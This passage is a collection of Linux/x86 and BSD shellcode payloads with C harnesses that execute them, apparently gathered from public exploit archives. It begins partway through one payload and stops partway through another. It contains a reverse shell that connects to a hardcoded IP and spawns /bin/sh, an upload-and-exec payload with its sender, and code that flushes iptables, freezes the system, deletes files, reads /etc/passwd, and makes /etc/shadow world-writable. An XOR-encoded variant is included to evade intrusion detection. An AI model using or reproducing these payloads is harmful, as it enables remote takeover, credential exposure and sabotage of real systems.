                movb    $6,     %cl             # IPPROTO_TCP
                pushl   %ecx
                movb    $1,     %cl             # SOCK_STREAM
                pushl   %ecx
                movb    $2,     %cl             # AF_INET
                pushl   %ecx
                movl    %esp,   %ecx
                movb    $1,     %bl             # SYS_SOCKET
                movb    $102,   %al             # SYS_socketcall
                int     $0x80

                # connect(sock, sockaddr, 16)
                movl    %eax,   %edx
                xorl    %eax,   %eax
                xorl    %ecx,   %ecx
                pushl   %ecx
                pushl   %ecx
                pushl   $0x44434241             # ip address
                pushw   $0xefb0                 # port
                movb    $0x02,  %cl             # address family
                pushw   %cx
                movl    %esp,   %edi
                movb    $16,    %bl             # sizeof(sockaddr)
                pushl   %ebx
                pushl   %edi
                pushl   %edx                    # sock
                movl    %esp,   %ecx
                movb    $3,     %bl             # SYS_CONNECT
                movb    $102,   %al             # SYS_socketcall
                int     $0x80           
                xorl    %ecx,   %ecx
                cmpl    %eax,   %ecx
                je CONNECTED

                # exit()
                xorl    %eax,   %eax
                movb    $1,     %al             # SYS_exit
                int     $0x80

                CONNECTED:
                # dup2(sock, 0);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                int     $0x80

                # dup2(sock, 1);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                movb    $1,     %cl             # stdout
                int     $0x80

                # dup2(sock, 2);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                movb    $2,     %cl             # stderr
                int     $0x80

                # execve(argv[0], &argv[0], NULL);
                xorl    %eax,   %eax
                xorl    %edx,   %edx
                pushl   %eax
                pushl   $0x68732f6e             # the string
                pushl   $0x69622f2f             # //bin/sh
                movl    %esp,   %ebx
                pushl   %eax
                pushl   %ebx
                movl    %esp,   %ecx
                movb    $11,    %al             # SYS_execve
                int     $0x80

                # exit()
                xorl    %eax,   %eax
                movb    $1,     %al             # SYS_exit
                int     $0x80
                ");
}

int
main()
{
        void (*funct)();

        shellcode[33] = 81;     /* ip of www.netric.org :) */
        shellcode[34] = 17;
        shellcode[35] = 46;
        shellcode[36] = 156;

        (long) funct = &shellcode; 
        funct();        
        return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * /sbin/iptables --flush
 */

char
main[] =
        "\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
        "\x39\xd8\x75\x2d\x31\xc0\x50\x66"
        "\x68\x2d\x46\x89\xe6\x50\x68\x62"
        "\x6c\x65\x73\x68\x69\x70\x74\x61"
        "\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
        "\x2f\x73\x89\xe3\x8d\x54\x24\x10"
        "\x50\x56\x54\x89\xe1\xb0\x0b\xcd"
        "\x80\x89\xc3\x31\xc0\x31\xc9\x31"
        "\xd2\xb0\x07\xcd\x80"; 

        /* your evil shellcode here */

int 
asm_code()
{
        __asm("
                xorl %eax,%eax
                xorl %ebx,%ebx
                movb $2, %al
                int $0x080
                cmpl %ebx,%eax
                jne WAIT

                xorl  %eax,%eax
                pushl %eax
                pushw $0x462d
                movl %esp,%esi
                pushl %eax
                pushl $0x73656c62
                pushl $0x61747069
                pushl $0x2f6e6962
                pushl $0x732f2f2f
                movl   %esp,%ebx
                leal   0x10(%esp),%edx
                pushl  %eax
                pushl  %esi
                pushl  %esp
                movl   %esp,%ecx
                movb   $0xb,%al
                int    $0x80

                WAIT:
                movl %eax, %ebx
                xorl %eax, %eax
                xorl %ecx, %ecx
                xorl %edx, %edx
                movb $7, %al
                int $0x80
                ");

}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * linux-x86-swap-store.c - SWAP store shellcode 99 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security & rfdslabs
 *
 * Authors:
 *
 *	dx 	<xgc@gotfault.net> 
 *	spud	<gustavo@rfdslabs.com.br>
 * 
 * This shellcode reads the content of '/tmp/sws' and stores on swap 
 * device at offset 31337. Probaly needs to change the device path name
 * in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_WRONLY) */

  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\x99"                        // cltd   
  "\x52"                        // push   %edx
  "\x68\x73\x64\x61\x31"        // push   $0x31616473
  "\x68\x64\x65\x76\x2f"        // push   $0x2f766564
  "\x66\x68\x2f\x2f"            // pushw  $0x2f2f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x6a\x01"                    // push   $0x1
  "\x59"                        // pop    %ecx
  "\xcd\x80"                    // int    $0x80

  "\x97"                        // xchg   %eax,%edi

  /* open("/tmp/sws", O_RDONLY) */

  "\x49"                        // dec    %ecx
  "\x52"                        // push   %edx
  "\x68\x2f\x73\x77\x73"        // push   $0x7377732f
  "\x68\x2f\x74\x6d\x70"        // push   $0x706d742f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* read(fd_filename, *buf, 256) */

  "\x89\xe1"                    // mov    %esp,%ecx
  "\x42"                        // inc    %edx
  "\xc1\xe2\x0a"                // shl    $0xa,%edx
  "\x6a\x03"                    // push   $0x3
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x96"                        // xchg   %eax,%esi

  /* close(fd_filename) */

  "\x6a\x06"                    // push   $0x6
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x92"                        // xchg   %eax,%edx

  /* lseek(fd_device, 31337, SEEK_SET) */

  "\x31\xc9"                    // xor    %ecx,%ecx
  "\x6a\x13"                    // push   $0x13
  "\x58"                        // pop    %eax
  "\x89\xfb"                    // mov    %edi,%ebx
  "\x66\xb9\x69\x7a"            // mov    $0x7a69,%cx
  "\xcd\x80"                    // int    $0x80

  /* write(fd_device, *buf, 1025) */


  "\x89\x14\x34"                // mov    %edx,(%esp,%esi,1)
  "\x6a\x04"                    // push   $0x4
  "\x58"                        // pop    %eax
  "\x54"                        // push   %esp
  "\x59"                        // pop    %ecx
  "\x56"                        // push   %esi
  "\x5a"                        // pop    %edx
  "\x42"                        // inc    %edx
  "\xcd\x80"                    // int    $0x80

  /* close(fd_device) */

  "\xb0\x06"                    // mov    $0x6,%al
  "\xcd\x80"                    // int    $0x80

  /* exit(anything) */

  "\xb0\x01"                    // mov    $0x1,%al
  "\xcd\x80"                    // int    $0x80
;

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * linux-x86-swap-restore.c - SWAP restore shellcode 109 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security & rfdslabs
 *
 * Authors:
 *
 *      dx      <xgc@gotfault.net>
 *      spud    <gustavo@rfdslabs.com.br>
 *
 * This shellcode reads the swap device at offset 31337. After it searchs by
 * NULL byte, it stops and write the readed content to '/tmp/swr' file.
 * Probaly you needs to change the device path name in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_RDONLY) */

  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\x99"                        // cltd   
  "\x52"                        // push   %edx
  "\x68\x73\x64\x61\x31"        // push   $0x31616473
  "\x68\x64\x65\x76\x2f"        // push   $0x2f766564
  "\x66\x68\x2f\x2f"            // pushw  $0x2f2f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x52"                        // push   %edx
  "\x59"                        // pop    %ecx
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* lseek(fd_device, 31337, SEEK_SET) */

  "\x31\xc9"                    // xor    %ecx,%ecx
  "\x6a\x13"                    // push   $0x13
  "\x58"                        // pop    %eax
  "\x66\xb9\x69\x7a"            // mov    $0x7a69,%cx
  "\xcd\x80"                    // int    $0x80

  /* read(fd_device, *buf, 1025) */

  "\x89\xe1"                    // mov    %esp,%ecx
  "\x42"                        // inc    %edx
  "\xc1\xe2\x0a"                // shl    $0xa,%edx
  "\x42"                        // inc    %edx
  "\x6a\x03"                    // push   $0x3
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x89\xe6"                    // mov    %esp,%esi
  "\x99"                        // cltd   
  "\x31\xff"                    // xor    %edi,%edi

  /* counter loop - read each byte and searchs by 0x0. */

  "\xac"                        // lods   %ds
  "\x38\xd0"                    // cmp    %dl,%al
  "\x74\x04"                    // je     80480b3 <close_device>
  "\x47"                        // inc    %edi
  "\xeb\xf8"                    // jmp    80480aa <counter>

  "\x91"                        // xchg   %eax,%ecx

  /* close(fd_device) */

  "\x6a\x06"                    // push   $0x6
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80
  "\x89\xe6"                    // mov    %esp,%esi

  /* open("/tmp/swr", O_CREAT|O_APPEND|O_WRONLY) */

  "\x66\xb9\x41\x04"            // mov    $0x441,%cx
  "\x52"                        // push   %edx
  "\x68\x2f\x73\x77\x72"        // push   $0x7277732f
  "\x68\x2f\x74\x6d\x70"        // push   $0x706d742f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\xb0\x05"                    // mov    $0x5,%al
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* write(fd_filename, *buf, sizeof(buffer)) */

  "\x6a\x04"                    // push   $0x4
  "\x58"                        // pop    %eax
  "\x56"                        // push   %esi
  "\x59"                        // pop    %ecx
  "\x89\xfa"                    // mov    %edi,%edx
  "\xcd\x80"                    // int    $0x80

  /* close(fd_filename) */

  "\xb0\x06"                    // mov    $0x6,%al
  "\xcd\x80"                    // int    $0x80

  /* exit(anything) */

  "\xb0\x01"                    // mov    $0x1,%al
  "\xcd\x80"                    // int    $0x80
;

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ "Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP"`   "YmmMMMM""  MMM     YM

 	[ dun[at]strcpy.pl ]
  
 [ linux/x86 iopl(3); asm("cli"); while(1){} 12 bytes ]
 
 ###############################################################
   iopl(3); asm("cli"); while(1){}
   // * this code cause freezeing system
 #################################################################
 
 __asm__(
	"xorl %eax, %eax\n"
	"pushl $0x3\n"
	"popl %ebx\n"
	"movb $0x6e,%al\n"
	"int $0x80\n"
	"cli\n"
	"x1:\n"
	"jmp x1\n"
 );

*/


char shellcode[]="\x31\xc0\x6a\x03\x5b\xb0\x6e\xcd\x80\xfa\xeb\xfe";

int main() {

	void (*sc)();
	sc = (void *)&shellcode;
	sc();
	
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*The shellcode calls the symlink() and makes the 
 link to the /bin/sh in the current dir.
	short version with anti IDS xoring
 size = 56 bytes
 OS   = *BSD
 	written by /rootteam/dev0id (www.sysworld.net)
				dev0id@uncompiled.com
BITS 32
jmp short	callme
main:
	pop	esi
	xor	ecx,ecx
	mov	cl,32
main_loop:
	xor byte	[esi+ecx],0x0f
	loop	main_loop
	xor byte	[esi+ecx],0x0f
	push	esi
	ret	
callme:
xored_shellcode:
	call	main
	db 0xe4,0x1d,0x51,0x3e,0xcf,0x87,0x49,0x08,0x82,0x51,0x0a,0x5c,0x82,0x11,0x5c
	db 0xbf,0x36,0x5f,0xc2,0x8f,0xe7,0xe6,0xf0,0xf0,0xf0,0x20,0x6d,0x66,0x61,0x20
	db 0x7c,0x67
	
*/

char shellcode[] =
	"\xeb\x11\x5e\x31\xc9\xb1\x20\x80\x34\x0e\x0f\xe2\xfa\x80\x34"
	"\x0e\x0f\x56\xc3\xe8\xea\xff\xff\xff\xe4\x1d\x51\x3e\xcf\x87"
	"\x49\x08\x82\x51\x0a\x5c\x82\x11\x5c\xbf\x36\x5f\xc2\x8f\xe7"
	"\xe6\xf0\xf0\xf0\x20\x6d\x66\x61\x20\x7c\x67";

int
main (void)
{
	void (*code)(void);
	code=(void(*)())shellcode;
	(void)code();
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* The shellcode flushs the iptables  by running /sbin/iptables -F
   no exit()
   greetz to zilion: man, my code is shorter!

   size = 58 bytes 
   OS	= Linux i386
 		written by /rootteam/dev0id (www.sysworld.net)
 

BITS	32

jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+14],al
	mov byte [esi+17],al
	mov long [esi+18],esi
	lea	 ebx,[esi+15]
	mov long [esi+22],ebx
	mov long [esi+26],eax
	mov 	al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+18]
	lea	edx,[esi+26]
	int	0x80
	

callme:
	call	main
	db '/sbin/iptables#-F#'
*/


char shellcode[] =
	"\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
	"\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
	"\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e"
	"\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x23\x2d\x46\x23";

	
int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Author    : darkjoker
Site      : http://darkjoker.net23.net
Shellcode : linux/x86 Perl script execution 99 bytes + script length


        .global _start

_start:
        xor     %eax, %eax
        xor     %ebx, %ebx
        xor     %ecx, %ecx
        xor     %edx, %edx
        xor     %edi, %edi
        xor     %esi, %esi
        push    %eax
        push    $0x6c702e30
        push    $0x30307470
        push    $0x69726373

        mov     %esp, %ebx
        movb    $0x5, %al
        movb    $0x41, %cl
        int     $0x80
        jmp     one

two:

        mov     %ebx, %esi
        mov     %eax, %ebx

        pop     %edi

        push    %edi

	// Begin http://www.int80h.org/strlen/
	xor     %ecx, %ecx
        xor     %eax, %eax
        not     %ecx
        repne   scasb
        not     %ecx
        dec     %ecx
	// End   http://www.int80h.org/strlen/

        pop     %edi
        mov     %ecx, %eax
        mov     %edi, %ecx
        mov     %eax, %edx

        movb    $0x4, %al
        int     $0x80

        movb    $0x6, %al
        int     $0x80

        mov     %esi, %ebx
        movb    $0xf, %al
        movw    $0x1fc, %cx
        int     $0x80

        movb    $0xb, %al
        xor     %ecx, %ecx
        xor     %edx, %edx
        int     $0x80

        movb    $0x1, %al
        xor     %ebx, %ebx
        int     $0x80

one:
        call    two
        .string "#!/usr/bin/perl\nprint (\"Hello world!\\n\");\n"
*/
char main [] = 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\x31\xff\x31\xf6\x50\x68\x30\x2e"
"\x70\x6c\x68\x70\x74\x30\x30\x68"
"\x73\x63\x72\x69\x89\xe3\xb0\x05"
"\xb1\x41\xcd\x80\xeb\x38\x89\xde"
"\x89\xc3\x5f\x57\x31\xc9\x31\xc0"
"\xf7\xd1\xf2\xae\xf7\xd1\x49\x5f"
"\x89\xc8\x89\xf9\x89\xc2\xb0\x04"
"\xcd\x80\xb0\x06\xcd\x80\x89\xf3"
"\xb0\x0f\x66\xb9\xfc\x01\xcd\x80"
"\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"
"\xb0\x01\x31\xdb\xcd\x80\xe8\xc3"
"\xff\xff\xff"
"#!/usr/bin/perl\nprint (\"Hello world!\\n\");\n"; // Here script source



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Author    : darkjoker
Site      : http://darkjoker.net23.net
Shellcode : linux/x86 File unlinker 18 bytes + file path length

        .global _start
_start:
        jmp     one

two:
        pop     %ebx
        movb    $0xa,%al
        int     $0x80

        movb    $0x1, %al
        xor     %ebx, %ebx
        int     $0x80

one:
        call    two
        .string "file"
*/

char main [] =
"\xeb\x0b\x5b\xb0\x0a\xcd\x80\xb0"
"\x01\x31\xdb\xcd\x80\xe8\xf0\xff"
"\xff\xff"
"file" //Here file path to delete




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

UPLOAD & EXEC SHELLCODE

[1] converting asm to hex
[2] asm code
[3] hex output
[4] upload function

This is an 'upload and exec' shellcode for the x86 platform.
File has to be in executable format,
cool if you know the distribution of the target, otherwise
it is useless.

-cybertronic

[1]

/*
 * convert .s to shellcode typo/teso (typo@inferno.tusculum.edu)
 *
 * $ cat asm.s
 * .globl cbegin
 * .globl cend
 * cbegin:
 * "asm goes here"
 * cend:
 * $ gcc -Wall asm.s asm2hex.c -o out
 * $ ./out
 *
 */

#include

extern void cbegin();
extern void cend();

int
main ()
{
    int i = 0;
    int x = 0;
    char* buf = ( char* ) cbegin;

    printf ( "unsigned char shellcode[] =\n\"" );
    for ( ; ( *buf ) && ( buf < ( char* ) cend ); buf++ )
	{
		if ( i++ == 16 )
			i = 1;
		if ( i == 1 && x != 0 )
			printf ( "\"\n\"" );
		x = 1;
		printf ( "\\x%02x", ( unsigned char )* buf );
	}
	printf ( "\";\n" );
    return ( 0 );
}

[2]

# append to any bind shellcode
# gcc -Wall upload-exec.s asm2hex.c -o upload-exec
# cybertronic

.globl cbegin
.globl cend

cbegin:

	movl %eax,%ecx

	jmp getstr

start:

	popl %esi

	leal (%esi),%ebx
	xorl %eax,%eax
	movb %al,0x0b(%esi)

	pushl %esi
	pushl %ecx

	movb $0x05,%al
	movw $0x241,%cx
	movw $00777,%dx
	int  $0x80
	movl %eax,%edi
	popl %esi

read:

	movl %esi,%ebx
	movb $0x03,%al
	leal -200(%esp),%ecx
	movb $0x01,%dl
	int  $0x80

	cmpl $0xffffffff,%eax
	je end
	xorl %ecx,%ecx
	cmpl %eax,%ecx
	je continue

	leal -200(%esp),%ecx
	xorl %ebx,%ebx
	movl %edi,%ebx
	movl %eax,%edx
	movb $0x04,%al
	int  $0x80

	jmp read

continue:

	movb $0x06,%al
	movl %esi,%ebx
	int  $0x80
	movb $0x06,%al
	xorl %ebx,%ebx
	movl %edi,%ebx
	int  $0x80

	xorl %esi, %esi
	popl %esi
	movl %esi,0x0c(%esi)
	xorl %eax,%eax
	movl %eax,0x10(%esi)
	movb $0x0b,%al
	xchgl %esi,%ebx
	leal 0x0c(%ebx),%ecx
	leal 0x10(%ebx),%edx
	int $0x80

end:

	xorl %eax,%eax
	incl %eax
	int $0x80

getstr:

	call start
	.string "/usr/bin/ct"

cend:

[3]

/*
 * linux x86
 * 189 bytes upload & exec shellcode by cybertronic
 * cybertronic[at]gmx[dot]net
 *
 */

unsigned char shellcode[] =
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68\xc7\xc7\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0"
"\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50"
"\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc1\xeb\x70\x5e\x8d\x1e"
"\x31\xc0\x88\x46\x0b\x56\x51\xb0\x05\x66\xb9\x41\x02\x66\xba\xff"
"\x01\xcd\x80\x89\xc7\x5e\x89\xf3\xb0\x03\x8d\x8c\x24\x38\xff\xff"
"\xff\xb2\x01\xcd\x80\x83\xf8\xff\x74\x3e\x31\xc9\x39\xc1\x74\x13"
"\x8d\x8c\x24\x38\xff\xff\xff\x31\xdb\x89\xfb\x89\xc2\xb0\x04\xcd"
"\x80\xeb\xd3\xb0\x06\x89\xf3\xcd\x80\xb0\x06\x31\xdb\x89\xfb\xcd"
"\x80\x31\xf6\x5e\x89\x76\x0c\x31\xc0\x89\x46\x10\xb0\x0b\x87\xf3"
"\x8d\x4b\x0c\x8d\x53\x10\xcd\x80\x31\xc0\x40\xcd\x80\xe8\x8b\xff"
"\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x74";

[4]

int
upload ( char* ip )
{
	int s;
	int fd;
	char ch;
	struct stat st;

	s = conn ( ip );

	if ( ( fd = open ( "file", O_RDONLY ) ) == -1 )
		return ( 1 );
	fstat ( fd, &st );
	while ( st.st_size-- > 0 )
	{
		if ( read ( fd, &ch, 1 ) < 0 )
			return ( 1 );
		if ( write ( s, &ch, 1 ) < 0 )
			return ( 1 );
	}
	close ( fd );
	close ( s );
	return ( 0 );
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 
$Id: where-is-wallie.c, v 1.0 2010/04/24 18:32:29 condis Exp $
 
linux/x86 sends "Phuck3d!" to all terminals (60 bytes) shellcode
by condis
 
Tested on: Linux Debian
 
*/
 
int main(void)
{
    char evil[] =  
 
        "\x6a\x0b"              // push   $0xb
        "\x58"                  // pop    %eax
        "\x99"                  // cltd
        "\x52"                  // push   %edx
        "\x68\x77\x61\x6c\x6c"  // push   $0x6c6c6177
        "\x68\x21\x20\x7c\x20"  // push   $0x207c2021
        "\x68\x63\x6b\x33\x64"  // push   $0x64336b63
        "\x68\x20\x50\x68\x75"  // push   $0x75685020
        "\x68\x65\x63\x68\x6f"  // push   $0x6f686365
        "\x89\xe6"              // mov    %esp,%esi
        "\x52"                  // push   %edx
        "\x66\x68\x2d\x63"      // pushw  $0x632d
        "\x89\xe1"              // mov    %esp,%ecx
        "\x52"                  // push   %edx
        "\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
        "\x89\xe3"              // mov    %esp,%ebx
        "\x52"                  // push   %edx
        "\x56"                  // push   %esi
        "\x51"                  // push   %ecx
        "\x53"                  // push   %ebx
        "\x89\xe1"              // mov    %esp,%ecx
        "\xcd\x80"              // int    $0x80
 
 
    void(*boom)()=(void*)evil;
    boom();
 
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
	xor	%eax, %eax
	xor	%ebx, %ebx
	xor	%ecx, %ecx
	xor	%edx, %edx
	jmp	two

one:
	pop	%ebx
	
	movb	$5, %al
	xor	%ecx, %ecx
	int	$0x80
	
	mov	%eax, %esi
	jmp	read

exit:
	movb	$1, %al
	xor	%ebx, %ebx
	int	$0x80

read:
	mov	%esi, %ebx
	movb	$3, %al
	sub	$1, %esp
	lea	(%esp), %ecx
	movb	$1, %dl
	int	$0x80

	xor	%ebx, %ebx
	cmp	%eax, %ebx
	je	exit

	movb	$4, %al
	movb	$1, %bl
	movb	$1, %dl
	int	$0x80
	
	add	$1, %esp
	jmp	read

two:
	call	one
	.string	"file_name"
*/
char main[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload
 Copyright(c) 2005 c0ntex <c0ntex@open-security.org>
 Copyright(c) 2005 BaCkSpAcE <sinisa86@gmail.com>

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 MA  02111-1307  USA

*/

/*

Tested: fedora core 3 - c0ntex
	fedora core 4 - BaCkSpAcE
        debian SID - amnesia

execve("/bin/sh") using sysenter from __kernel_vsyscall appose to int $0x80

(gdb) disas __kernel_vsyscall
Dump of assembler code for function __kernel_vsyscall:
0xffffe400 <__kernel_vsyscall+0>:       push   %ecx
0xffffe401 <__kernel_vsyscall+1>:       push   %edx
0xffffe402 <__kernel_vsyscall+2>:       push   %ebp
0xffffe403 <__kernel_vsyscall+3>:       mov    %esp,%ebp
0xffffe405 <__kernel_vsyscall+5>:       sysenter
0xffffe407 <__kernel_vsyscall+7>:       nop
0xffffe408 <__kernel_vsyscall+8>:       nop
0xffffe409 <__kernel_vsyscall+9>:       nop
0xffffe40a <__kernel_vsyscall+10>:      nop
0xffffe40b <__kernel_vsyscall+11>:      nop
0xffffe40c <__kernel_vsyscall+12>:      nop
0xffffe40d <__kernel_vsyscall+13>:      nop
0xffffe40e <__kernel_vsyscall+14>:      jmp    0xffffe403 <__kernel_vsyscall+3>
0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp
0xffffe411 <__kernel_vsyscall+17>:      pop    %edx
0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx
0xffffe413 <__kernel_vsyscall+19>:      ret
0xffffe414 <__kernel_vsyscall+20>:      add    %al,(%eax)
0xffffe416 <__kernel_vsyscall+22>:      add    %al,(%eax)
0xffffe418 <__kernel_vsyscall+24>:      add    %al,(%eax)
0xffffe41a <__kernel_vsyscall+26>:      add    %al,(%eax)
0xffffe41c <__kernel_vsyscall+28>:      add    %al,(%eax)
0xffffe41e <__kernel_vsyscall+30>:      add    %al,(%eax)
End of assembler dump.
(gdb) q

so we replace

int $0x80

instruction with

push   %ecx
push   %edx
push   %ebp
mov    %esp,%ebp
sysenter

which does make the shellcode slightly larger  :/


 804807a:       51                      push   %ecx
 804807b:       52                      push   %edx
 804807c:       55                      push   %ebp
 804807d:       89 e5                   mov    %esp,%ebp
 804807f:       0f 34                   sysenter

 $ ./lnx_binsh4

 [-] Stack Pointer found -> [0xbfe0f0d8]
         [-] Size of payload egg -> [23]
	 [-] Payload Begin -> [0x80496c0]
	 [-] Payload End   -> [0x80496d7]

 sh-3.00b$

*/

/*
 Calling: execve(/bin/sh), exit(0)
*/


#include <stdio.h>

typedef char wikkid;

/* reduced shellcode size from 45 to 23 - BaCkSpAcE */
wikkid oPc0d3z[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
                   "\x73\x68\x68\x2f\x62\x69\x6e\x54"
                   "\x5b\x52\x53\x54\x59\x0f\x34";

unsigned long grab_esp()
{
		__asm__("movl %esp,%eax");
}

int main(void)
{
	unsigned long delta;
	void (*pointer)();

	delta = grab_esp();

	fprintf(stderr, "\n[-] Stack Pointer found -> [0x%x]\n", delta);
	fprintf(stderr, "\t[-] Size of payload egg -> [%d]\n", sizeof(oPc0d3z)-1);

	pointer=(void*)&oPc0d3z;

	while(pointer) {
		fprintf(stderr, "\t[-] Payload Begin -> [0x%x]\n", pointer);
		fprintf(stderr, "\t[-] Payload End   -> [0x%x]\n\n", pointer+23);
		pointer();
	}

	_exit(0);
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 * /
int main()
{
    char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                              "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                              "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
    //setreuid(geteuid(),geteuid());
    //execve("/bin/sh",0,0);
    __asm__(""
            "push $0x31;"
            "pop %eax;"
            "cltd;"
            "int $0x80;"        // geteuid();
            "mov %eax, %ebx;"
            "mov %eax, %ecx;"
            "push $0x46;"    // setreuid(geteuid(),geteuid());
            "pop %eax;"
            "int $0x80;"
            "mov $0xb, %al;"
            "push %edx;"
            "push $0x68732f6e;"
            "push $0x69622f2f;"
            "mov %esp, %ebx;"
            "mov %edx, %ecx;"
            "int $0x80;"        // execve("/bin/sh",0,0);
            "");
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 db                	xor    %ebx,%ebx
 b0 17                	mov    $0x17,%al
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 63 2f 73 68       	push   $0x68732f63
 68 2f 2f 65 74       	push   $0x74652f2f
 89 e3                	mov    %esp,%ebx
 66 b9 b6 01          	mov    $0x1b6,%cx
 b0 0f                	mov    $0xf,%al
 cd 80                	int    $0x80
 40                   	inc    %eax
 cd 80                	int    $0x80
*/

int main(){
